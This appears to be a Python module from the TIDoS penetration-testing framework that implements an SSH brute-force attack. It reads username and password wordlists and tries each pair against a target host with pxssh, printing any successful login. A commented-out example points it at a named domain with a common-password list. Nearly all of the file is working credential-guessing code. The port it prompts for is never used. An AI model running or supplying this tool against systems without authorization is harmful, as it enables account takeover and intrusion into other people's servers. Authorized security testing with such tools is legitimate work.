#!/usr/bin/env python
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#	TIDoS Framework	 #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires pip3 install pexpect

from __future__ import print_function
import pexpect
import time
import socket
from pexpect import pxssh
class color:
	PURPLE = '\033[95m'
	CYAN = '\033[96m'
	DARKCYAN = '\033[36m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
	END = '\033[0m'
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'

W  = '\033[1;0m'  # white (normal)
R  = '\033[1;31m' # red
G  = '\033[1;32m' # green
O  = '\033[1;33m' # orange
B  = '\033[1;34m' # blue
P  = '\033[1;35m' # purple
C  = '\033[1;36m' # cyan
GR = '\033[1;37m' # gray
T = '\033[1;93m' # tan

###


sshpass = []
sshuser = []

def sshbrute(web , users , pass_file):
		print(GR+' [*] Testing target...')
		ip = socket.gethostbyname(web)
		m = input(O+' [#] Use IP '+R+str(ip)+O+'? (y/n) :> ')
		if m in 'y' or m == 'Y':
			pass
		elif m == 'n' or m == 'N':
			ip = input(O+' [#] Enter IP :> ')

		print(G+' [+] Target appears online...')
		port = input(GR+' [#] Enter the port (eg. 22) :> ')

		try:
			if type(users) is list :
				for u in users:
					sshuser.append(u) 
			else : 
				with open(users,'r') as users:
					for u in users:
						u = u.strip('\n')
						sshuser.append(u)

			with open(pass_file,'r') as pas:
				for p in pas:
					p = p.strip('\n')
					sshpass.append(p)
		except IOError:
			print(R+' [-] Importing wordlist failed!')

		for user in sshuser:
			for password in sshpass:
				try:
					connect = pxssh.pxssh()
					connect.login(ip,str(user),password)
					if True:
						print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
						break
				except KeyboardInterrupt:
					quit()
				except:
					print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')

	#except :
	#	print(R+' [-] Target seems to be down!')
	#print(G+" [+] Done!")

#sshbrute('faznol.com' , ['root'] , '/usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt')